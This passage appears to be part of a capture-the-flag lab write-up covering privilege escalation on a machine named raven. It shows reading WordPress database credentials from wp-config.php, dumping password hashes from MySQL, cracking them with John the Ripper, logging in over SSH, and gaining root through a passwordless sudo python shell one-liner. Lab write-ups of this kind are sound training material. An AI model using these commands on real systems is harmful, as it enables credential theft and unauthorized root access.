# 03 - Privilege Escalation

## WordPress Configuration

After gaining shell access, I inspected the WordPress configuration file.

```bash
cat /var/www/html/wordpress/wp-config.php
```

The configuration file contained the MySQL credentials.

---

## MySQL Enumeration

```bash
mysql -u root -p
```

Inside the WordPress database:

```sql
USE wordpress;

SELECT * FROM wp_users;
```

The table contained another user:

```
steven
```

along with the password hash.

---

## Password Cracking

I copied the password hash and cracked it using John the Ripper.

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

John successfully recovered Steven's password.

---

## SSH Login

```bash
ssh steven@<TARGET_IP>
```

---

## Sudo Enumeration

```bash
sudo -l
```

Output

```
User steven may run the following commands on raven:

(ALL) NOPASSWD: /usr/bin/python
```

---

## Root Shell

```bash
sudo /usr/bin/python -c 'import os; os.system("/bin/bash")'
```

Verify

```bash
whoami
```

Output

```
root
```
